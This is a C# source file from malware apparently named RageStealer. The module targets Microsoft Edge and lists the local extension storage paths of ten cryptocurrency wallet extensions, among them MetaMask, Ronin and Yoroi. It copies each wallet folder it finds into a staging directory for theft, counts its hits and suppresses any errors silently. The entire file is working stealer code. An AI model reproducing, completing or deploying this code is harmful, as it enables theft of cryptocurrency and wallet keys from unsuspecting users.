using System.Collections.Generic;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Crypto.Browsers;

internal class Edge
{
	private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
	{
		new string[2] { "Edge_Auvitas_", "Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga" },
		new string[2] { "Edge_Math_", "Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm" },
		new string[2] { "Edge_Metamask_", "Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm" },
		new string[2] { "Edge_MTV_", "Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl" },
		new string[2] { "Edge_Rabet_", "Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd" },
		new string[2] { "Edge_Ronin_", "Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp" },
		new string[2] { "Edge_Yoroi_", "Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb" },
		new string[2] { "Edge_Zilpay_", "Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec" },
		new string[2] { "Edge_Terra_Station_", "Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie" },
		new string[2] { "Edge_Jaxx_", "Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci" }
	};

	public static void GetEdgeWallets(string edgeprofile, string sSaveDir)
	{
		try
		{
			foreach (string[] edgeWalletsDirectory in EdgeWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sSaveDir, Path.Combine(edgeprofile, edgeWalletsDirectory[1]), edgeWalletsDirectory[0] + Path.GetFileName(edgeprofile));
			}
		}
		catch
		{
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			Counter.BrowserWallets++;
		}
	}
}
